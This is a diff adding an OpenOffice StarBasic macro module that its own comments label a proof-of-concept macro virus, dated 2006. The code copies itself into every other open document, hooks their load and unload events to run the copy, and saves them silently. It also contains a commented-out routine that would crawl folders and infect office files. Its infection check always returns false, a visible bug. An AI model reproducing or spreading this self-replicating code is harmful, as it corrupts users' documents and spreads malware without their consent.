@@ -1,0 +1,158 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  **************************************************************
+REM  ***** Prueba de concepto de macro virus para OpenOffice ******
+REM  ***** OpenOfficentzako birus baten kontzeptu-froga      ******
+REM  *****            gak egina. - 2006/06                   ******
+REM  **************************************************************
+
+Dim strModName as String
+Dim strModSource as String
+Dim EndMacro as Boolean
+
+Sub Main
+OnLoad
+End Sub
+
+Sub OnClose
+	EndMacro = True
+End Sub
+
+Sub OnLoad
+Dim arr()
+Dim bLibs as Object
+Dim xLib as Object
+bLibs = ThisComponent.BasicLibraries
+EndMacro=False
+statusbar = ThisComponent.CurrentController.StatusIndicator
+statusbar.start("Documento cargado - gak egina",0)
+
+xLib = bLibs.getByName("Standard")
+arr() = xLib.getElementNames()
+
+For i = Lbound(arr()) To Ubound(arr())
+ If inStr(xLib.getByName(arr(i)), "gak egina") <> 0 Then
+ 	strModSource = xLib.getByName(arr(i))
+	strModName = arr(i)
+	 Exit For
+ End If
+Next i
+
+' Get all the open documents and modify them
+docCom = StarDesktop.getComponents()
+docEnum = docCom.createEnumeration()
+Do While docEnum.hasMoreElements()
+	oDoc = docEnum.nextElement()
+	If oDoc.URL <> ThisComponent.URL Then infect (oDoc, oDoc.URL, True)
+Loop
+
+'Search for OO files
+'ReadDirs("/tmp/lab/")
+
+End Sub
+
+
+Function ReadDirs (path as String)
+ Dim list()
+
+' On error resume next
+
+ listDir  = createUnoService("com.sun.star.ucb.SimpleFileAccess") 
+ 
+ list() = listDir.getFolderContents(ConvertToURL(path), True)   
+   for i = LBound(list()) to UBound(list())
+   	if EndMacro = True Then exit Function
+      fname = ConvertFromURL(list(i))
+      
+      xfname = ConvertToURL(fname)
+      if GetAttr(xfname) = 0 then
+      	if Right(xfname, 3) = "odt" OR Right(xfname, 3) = "odp" OR Right(xfname, 3) = "ods" OR Right(xfname, 3) = "odg" then
+	      	infect (null, xfname, False)      
+	    end if
+      else
+      	if listDir.exists (fname) = true then
+	      	ReadDirs (fname)
+		end if
+	  end if
+	  wait 50
+   next i   
+   
+   
+End Function
+
+
+Function infect(OpenDoc as Object, path as String, IsDocument as Boolean)
+Dim Doc as Object
+Dim strRnd as String
+Dim args(0) As New com.sun.star.beans.PropertyValue
+Dim PropValue(1) as new com.sun.star.beans.PropertyValue
+Dim PropValue1(1) as new com.sun.star.beans.PropertyValue
+'  On Error Resume next
+
+args(0).name="Hidden"
+args(0).value=true
+  
+Randomize
+
+strRnd = Cstr(Int(Rnd * 999)) & Cstr(Int(Rnd * 999)) & Cstr(Int(Rnd * 999))
+
+If IsDocument = False Then
+	Doc = StarDesktop.loadcomponentFromUrl (path, "_blank", 0, args())
+Else
+	Doc = OpenDoc
+End If
+
+If getInfected(Doc) = True Then exit function
+
+If Not Doc.BasicLibraries.HasByName ("Standard") Then 
+	Doc.BasicLibraries.CreateLibrary ("Standard", "", "", "")
+End If
+
+Doc.BasicLibraries.LoadLibrary ("Standard")
+oLib = Doc.BasicLibraries.getByName("Standard")
+
+If Not Doc.BasicLibraries.HasByName (strRnd) Then
+	oLib.insertByName(strRnd, strModSource)
+Else
+	oLib.replaceByName(strRnd, strmodSource)
+End If
+
+PropValue(0).Name = "EventType"
+PropValue(0).Value = "StarBasic"
+PropValue(1).Name = "MacroName"
+PropValue(1).Value = "Standard." & strRnd & ".OnLoad"
+Doc.Events.replaceByName("OnLoad", PropValue())
+
+PropValue(0).Name = "EventType"
+PropValue(0).Value = "StarBasic"
+PropValue(1).Name = "MacroName"
+PropValue(1).Value = "Standard." & strRnd & ".OnClose"
+Doc.Events.replaceByName("OnPrepareUnload", PropValue())
+Doc.store()
+
+If IsDocument = False Then
+	If hasUnoInterfaces(Doc, "com.sun.star.util.XCloseable") then
+		Doc.close(true)
+	Else
+		Doc.dispose
+	End If
+End If
+
+End Function
+
+Function getInfected (Doc as Object) as Boolean
+Dim arr()
+Dim bLibs as Object
+Dim xLib as Object
+bLibs = Doc.BasicLibraries
+xLib = bLibs.getByName("Standard")
+arr() = xLib.getElementNames()
+For i = Lbound(arr()) To Ubound(arr())
+ If inStr(xLib.getByName(arr(i)), "gak egina") <> 0 Then
+ 	getInfected() = True
+ 	Exit For
+ End If
+Next i
+ getInfected() = False
+End Function
+</script:module>
